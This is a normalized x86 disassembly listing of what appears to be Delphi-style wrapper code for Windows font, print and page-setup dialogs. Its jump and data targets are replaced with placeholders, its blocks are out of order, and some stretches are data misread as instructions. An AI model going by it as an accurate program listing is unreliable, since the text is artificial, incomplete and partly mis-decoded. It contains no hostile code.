mov [ ebp - 0x34 ] 0x20
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov esi rw-data
mov edx eax
cmp dl 0x1f
ja r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ ebp - 0x34 ] 0xfff7ffff
xor [ ebp - 0x34 ] 0x80000
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test [ ebp - 0x32 ] 0x8
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5e ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_404510
mov [ ebp - 0x2c ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x78 ]
call sub_408510
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_4045b0
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x74 ]
call sub_4040e8
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
xor eax eax
mov esi rw-data
mov [ ebp - 0x24 ] sub_428310
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0xb0 ] edx
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x24 ] sub_4285e8
inc eax
add esi 0x4
cmp al 0x1
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x14 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov esi eax
test esi esi
je r-xdata
or [ ebp - 0x34 ] 0x40
mov [ ebp - 0x20 ] eax
mov edx eax
cmp dl 0x7
ja r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428c54
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404074
retn
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_428da8
test [ ebp - 0x33 ] 0x4
je r-xdata
and [ ebx + 0x5c ] 0xffffff7f
or [ ebx + 0x5c ] 0x80
jmp r-xdata
and [ ebx + 0x5c ] 0xfffffffe
or [ ebx + 0x5c ] 0x1
jmp r-xdata
test [ ebp - 0x34 ] 0x1
je r-xdata
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x64 ] eax
sub_428c60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x1 ]
mov eax esi
call sub_40c3ac
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx ebx
sub ecx esi
mov eax edi
mov edx esi
call sub_404140
inc ebx
mov eax edi
mov edx esi
call sub_404248
mov eax esi
call sub_408620
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_428ca8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_428d8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_428c60
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_428c60
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_408458
cmp [ eax ] 0x5c
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x5c
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404318
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428d94
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_428c60
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404310
cmp eax 0x3
jle r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40435c
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1 ] 0x3a
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2 ] 0x5c
je r-xdata
sub_428da8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_428e53
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5e ] 0x1
jne r-xdata
push ebp
mov eax [ edx + 0x1c ]
mov edx [ ebp - 0x8 ]
add edx 0x78
call sub_428c60
pop ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push ebp
mov eax [ edx + 0x1c ]
call sub_428ca8
pop ecx
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax 0x78
call sub_4040a4
jmp r-xdata
mov [ ebp - 0x1 ] 0x20
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428e5a
lea eax [ ebp - 0xc ]
call sub_404050
retn
sub_428e60
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
push 0x0
push esi
xor ecx ecx
xor edx edx
xor eax eax
call sub_412d08
test [ ebx + 0x5e ] 0x1
jne r-xdata
push esi
push edi
call GetClientRect
jmp r-xdata
push esi
push 0x45f
push edi
call GetDlgItem
push eax
call GetWindowRect
push 0x2
push esi
mov eax [ ebx + 0x3c ]
push eax
push 0x0
call MapWindowPoints
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_428eb4
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x78 ]
call sub_4040a4
cmp [ ebx + 0x3c ] 0x0
je r-xdata
mov eax esp
push eax
push 0x105
push 0x465
mov eax [ ebx + 0x3c ]
push eax
call GetParent
push eax
call SendMessageA
mov edx esi
mov eax esp
call sub_408820
jmp r-xdata
add esp 0x108
pop esi
pop ebx
retn
sub_428f1c
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov eax esi
call sub_404310
mov ebx eax
cmp ebx 0x1
jle r-xdata
lea eax [ edi + 0x6c ]
push eax
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_404570
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40c1f4
test al al
je r-xdata
mov ecx ebx
dec ecx
mov edx esi
mov eax r-xdata
call sub_40c228
test al al
jne r-xdata
dec ebx
sub_428f6b
inc [ ecx ]
add [ eax ] al
add [ edx ] bh
add [ eax ] al
add [ ebx - 0x75 ] dl
fdivr [ edx + GetOpenFileNameA ]
mov eax ebx
call sub_42899c
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_428fc0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax 0x111
jne r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
push eax
push edx
call sub_428310
cmp [ ebp + 0x10 ] 0x402
jne r-xdata
cmp [ ebp + 0x12 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_4290d4
mov eax 0x1
jmp r-xdata
pop ebp
retn 0x10
sub_429004
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_428378
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d7e4
mov [ esi + 0x58 ] eax
mov ax [ r-xdata ]
mov [ esi + 0x5d ] ax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_429056
add [ eax ] al
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x58 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4283c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_429088
cmp [ edx ] 0x111
jne r-xdata
call sub_4284a0
retn
cmp [ edx + 0x6 ] 0x9
jne r-xdata
mov cx [ edx + 0x4 ]
cmp cx 0x473
jne r-xdata
cmp cx 0x474
jne r-xdata
mov [ eax + 0x71 ] 0x1
jmp r-xdata
mov [ eax + 0x70 ] 0x1
sub_4290d4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x40 ]
push eax
push 0x0
push 0x401
push ebx
call SendMessageA
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_42933c
push 0x0
push 0x0
push 0x147
push 0x473
push ebx
call SendDlgItemMessageA
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor eax eax
push ebp
push sub_42915f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffed
call sub_403490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x0
push esi
push 0x150
push 0x473
push ebx
call SendDlgItemMessageA
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_41d9b8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429180
push ebp
mov ebp esp
add esp 0xffffff7c
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x84 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_429319
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x44 ] 0x3c
xor eax eax
mov [ ebp - 0x3c ] eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x80 ]
push eax
push 0x3c
mov eax [ ebx + 0x58 ]
call sub_41d9cc
push eax
call GetObjectA
lea eax [ ebp - 0x8 ]
lea edx [ ebp - 0x64 ]
mov ecx 0x20
call sub_4042c0
xor eax eax
mov al [ ebx + 0x5c ]
mov eax [ eax * 4 + rw-data ]
or eax 0x48
mov [ ebp - 0x30 ] eax
xor eax eax
mov esi rw-data
call sub_425bd8
call sub_425724
mov [ ebp - 0x3c ] eax
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5d ] edx
inc eax
add esi 0x4
cmp al 0x10
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x30 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
or [ ebp - 0x30 ] 0x200
mov eax [ ebx + 0x58 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] sub_428fc0
mov eax [ ebx + 0x68 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x6c ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x10 ]
jge r-xdata
or [ ebp - 0x30 ] 0x10
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x40 ] eax
mov esi [ rw-data ]
mov [ rw-data ] ebx
mov [ ebx + 0x71 ] 0x0
mov [ ebx + 0x70 ] 0x0
lea ecx [ ebp - 0x44 ]
mov edx ChooseFontA
mov eax ebx
mov edi [ eax ]
call [ edi + 0x38 ]
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
mov [ rw-data ] esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
and [ ebp - 0x30 ] 0xffffdfff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429320
lea eax [ ebp - 0x84 ]
call sub_404050
lea eax [ ebp - 0x8 ]
call sub_404050
retn
lea eax [ ebp - 0x84 ]
lea edx [ ebp - 0x64 ]
mov ecx 0x20
call sub_4042c0
mov edx [ ebp - 0x84 ]
mov eax [ ebp - 0x8 ]
call sub_407da4
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_42933c
cmp [ ebx + 0x71 ] 0x0
je r-xdata
mov [ ebx + 0x70 ] 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx + 0x58 ]
call sub_41d9b8
sub_42933c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4293d9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
lea edx [ edi + 0x1c ]
mov ecx 0x20
call sub_4042c0
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_41dbe0
mov edx [ edi ]
mov eax [ esi + 0x58 ]
call sub_41dba0
cmp [ esi + 0x70 ] 0x0
je r-xdata
mov bl [ r-xdata ]
cmp [ edi + 0x10 ] 0x190
jle r-xdata
mov dl [ edi + 0x17 ]
mov eax [ esi + 0x58 ]
call sub_41dce8
cmp [ edi + 0x14 ] 0x0
je r-xdata
or bl 0x1
cmp [ edi + 0x15 ] 0x0
je r-xdata
or bl 0x2
cmp [ edi + 0x16 ] 0x0
je r-xdata
or bl 0x4
mov edx ebx
mov eax [ esi + 0x58 ]
call sub_41dc84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4293e0
lea eax [ ebp - 0x4 ]
call sub_404050
retn
or bl 0x8
sub_4293ec
push ebp
mov ebp esp
add esp 0xfffff3fc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
lea eax [ ebp - 0xc04 ]
push eax
push ebx
call sub_425bd8
lea ecx [ ebp - 0x804 ]
lea edx [ ebp - 0x404 ]
call sub_425434
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x404 ]
call sub_408608
mov ebx eax
add ebx 0x8
lea eax [ ebp - 0x804 ]
call sub_408608
add ebx eax
lea eax [ ebp - 0xc04 ]
call sub_408608
add ebx eax
add ebx 0x3
push ebx
push 0x42
call GlobalAlloc
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_4294e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx esi
add ebx 0x8
mov edi esi
mov eax ebx
sub ax si
mov [ edi ] ax
lea edx [ ebp - 0x804 ]
mov eax ebx
call sub_40866c
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x2 ] ax
lea edx [ ebp - 0x404 ]
mov eax ebx
call sub_40866c
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x4 ] ax
lea edx [ ebp - 0xc04 ]
mov eax ebx
call sub_408644
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalUnlock
retn
sub_4294f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_42955c
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi ebx
movzx eax [ esi + 0x4 ]
mov edi ebx
add eax edi
push eax
mov eax [ ebp - 0x4 ]
push eax
call sub_425bd8
movzx ecx [ esi ]
add ecx edi
movzx edx [ esi + 0x2 ]
add edx edi
call sub_4254dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429563
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalFree
retn
sub_42956c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GlobalSize
mov ebx eax
push ebx
push 0x42
call GlobalAlloc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor edx edx
push ebp
push sub_4295ee
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
push eax
call GlobalLock
mov esi eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
retn
test eax eax
je r-xdata
mov edx eax
mov eax esi
mov ecx ebx
call sub_4028e0
sub_429604
push ebx
add esp 0xffffffb8
mov ebx eax
lea eax [ esp + 0x4 ]
xor ecx ecx
mov edx 0x42
call sub_402ca4
mov [ esp + 0x4 ] 0x42
mov eax [ rw-data ]
mov [ esp + 0x26 ] eax
lea edx [ esp + 0x10 ]
mov eax esp
call sub_4293ec
mov eax [ esp ]
call sub_42956c
mov [ esp + 0xc ] eax
mov [ esp + 0x18 ] 0x2040
mov [ esp + 0x32 ] sub_428310
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esp + 0x8 ] eax
lea ecx [ esp + 0x4 ]
mov edx PrintDlgA
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb eax eax
inc eax
mov ebx eax
test bl bl
je r-xdata
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
call sub_4294f0
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push eax
call GlobalFree
mov eax ebx
add esp 0x48
pop ebx
retn
push eax
call GlobalFree
sub_4296b0
push ebp
mov ebp esp
push ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e2d4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429717
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x10 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41e984
cmp [ ebp + 0xa ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42971e
mov eax [ ebp - 0x4 ]
call sub_403294
retn
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
dec eax
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_429724
push ebp
mov ebp esp
push ecx
push ebx
mov edx [ ebp + 0xc ]
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x10
mov [ ebp - 0x1 ] 0x0
cmp edx 0x400
jne r-xdata
add edx 0xfffffbff
cmp edx 0x5
ja r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xda ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x1 ]
jmp [ edx * 4 + jump_table_4297d5 ]
mov eax [ ebp + 0x10 ]
shr eax 0x10
mov edx eax
sub edx 0x1
je r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x104 ]
push [ eax + 0x100 ]
call sub_4296b0
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xf4 ]
push [ eax + 0xf0 ]
call sub_4296b0
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x114 ]
push [ eax + 0x110 ]
call sub_4296b0
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x10c ]
push [ eax + 0x108 ]
call sub_4296b0
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xfc ]
push [ eax + 0xf8 ]
call sub_4296b0
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xec ]
push [ eax + 0xe8 ]
call sub_4296b0
pop ecx
mov dl 0x1
sub edx 0x2
je r-xdata
sub edx 0x8
je r-xdata
sub edx 0xe
je r-xdata
xor edx edx
jmp r-xdata
and edx 0x7f
mov dl [ edx + rw-data ]
push edx
cmp eax 0xb
setg al
and eax 0x7f
mov al [ eax + rw-data ]
push eax
lea eax [ ebp - 0x1 ]
push eax
mov cx [ ebp + 0x10 ]
and cx 0xffff
mov ebx [ rw-data ]
mov edx [ rw-data ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
jmp r-xdata
sub_429898
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_428378
mov ax [ r-xdata ]
mov [ esi + 0x58 ] ax
mov eax esi
call sub_429adc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4298e2
add [ eax ] al
push ebx
push esi
push edi
add esp 0xffffffe4
mov edi eax
lea eax [ edi + 0x84 ]
xor ecx ecx
mov edx 0x54
call sub_402ca4
lea esi [ edi + 0x84 ]
mov [ esi ] 0x54
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x3c ] eax
lea edx [ esi + 0xc ]
mov eax esp
call sub_4293ec
mov eax [ esp ]
call sub_42956c
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] 0x400
lea eax [ edi + 0x84 ]
push eax
call PageSetupDlgA
mov [ esi + 0x10 ] 0x42002
mov al [ edi + 0xe0 ]
dec al
je r-xdata
add [ esi + 0x10 ] 0x8
dec al
jne r-xdata
test [ edi + 0x58 ] 0x2
je r-xdata
add [ esi + 0x10 ] 0x0
test [ edi + 0x58 ] 0x1
je r-xdata
add [ esi + 0x10 ] 0x4
jmp r-xdata
test [ edi + 0x58 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x10
test [ edi + 0x58 ] 0x8
je r-xdata
add [ esi + 0x10 ] 0x100
mov [ rw-data ] edi
mov [ esi + 0x48 ] sub_429724
add [ esi + 0x10 ] 0x80000
jmp r-xdata
test [ edi + 0x58 ] 0x20
je r-xdata
add [ esi + 0x10 ] 0x200
test [ edi + 0x58 ] 0x10
je r-xdata
test [ edi + 0x58 ] 0x40
je r-xdata
add [ esi + 0x10 ] 0x20
test [ edi + 0x58 ] 0x80
je r-xdata
add [ esi + 0x10 ] 0x2
test [ edi + 0x59 ] 0x1
je r-xdata
inc [ esi + 0x10 ]
test [ edi + 0x59 ] 0x2
jne r-xdata
add [ esi + 0x10 ] 0x800
test [ edi + 0x59 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x80
lea ecx [ esp + 0x4 ]
mov edx [ edi + 0x80 ]
mov eax [ edi + 0x7c ]
call sub_412ce0
mov eax [ esp + 0x4 ]
mov [ esi + 0x14 ] eax
mov eax [ esp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x68 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx [ edi + 0x64 ]
mov edx [ edi + 0x60 ]
mov eax [ edi + 0x5c ]
call sub_412d08
push esi
push edi
lea edi [ esi + 0x1c ]
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ edi + 0x78 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx [ edi + 0x74 ]
mov edx [ edi + 0x70 ]
mov eax [ edi + 0x6c ]
call sub_412d08
push esi
push edi
lea edi [ esi + 0x2c ]
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov [ esi + 0x44 ] sub_428310
lea ecx [ edi + 0x84 ]
mov edx PageSetupDlgA
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
add [ esi + 0x10 ] 0x200000
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
mov [ edi + 0x7c ] eax
mov eax [ esi + 0x18 ]
mov [ edi + 0x80 ] eax
mov eax [ esi + 0x2c ]
mov [ edi + 0x6c ] eax
mov eax [ esi + 0x30 ]
mov [ edi + 0x70 ] eax
mov eax [ esi + 0x34 ]
mov [ edi + 0x74 ] eax
mov eax [ esi + 0x38 ]
mov [ edi + 0x78 ] eax
mov edx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4294f0
jmp r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
mov eax ebx
add esp 0x1c
pop edi
pop esi
pop ebx
retn
push eax
call GlobalFree
sub_429adc
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov ebx eax
lea esi [ ebp - 0x55 ]
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_429b10
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_425bd8
call sub_425738
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
xor ecx ecx
mov edx 0x54
call sub_402ca4
mov [ esi ] 0x54
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x3c ] eax
mov al [ ebx + 0xe0 ]
dec al
je r-xdata
add [ esi + 0x10 ] 0x8
dec al
jne r-xdata
test [ ebx + 0x58 ] 0x2
je r-xdata
add [ esi + 0x10 ] 0x0
test [ ebx + 0x58 ] 0x1
je r-xdata
add [ esi + 0x10 ] 0x4
jmp r-xdata
test [ ebx + 0x58 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x10
test [ ebx + 0x58 ] 0x8
je r-xdata
add [ esi + 0x10 ] 0x100
test [ ebx + 0x58 ] 0x10
je r-xdata
add [ esi + 0x10 ] 0x80000
test [ ebx + 0x58 ] 0x20
je r-xdata
add [ esi + 0x10 ] 0x200
lea ecx [ ebp - 0x60 ]
mov edx [ ebx + 0x80 ]
mov eax [ ebx + 0x7c ]
call sub_412ce0
mov eax [ ebp - 0x60 ]
mov [ esi + 0x14 ] eax
mov eax [ ebp - 0x5c ]
mov [ esi + 0x18 ] eax
mov eax [ ebx + 0x68 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebx + 0x64 ]
mov edx [ ebx + 0x60 ]
mov eax [ ebx + 0x5c ]
call sub_412d08
push esi
lea edi [ esi + 0x1c ]
lea esi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebx + 0x78 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebx + 0x74 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x6c ]
call sub_412d08
push esi
lea edi [ esi + 0x2c ]
lea esi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x44 ] sub_428310
or [ esi + 0x10 ] 0x400
push esi
call PageSetupDlgA
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add [ esi + 0x10 ] 0x20
mov al [ ebp - 0x1 ]
pop edi
pop esi
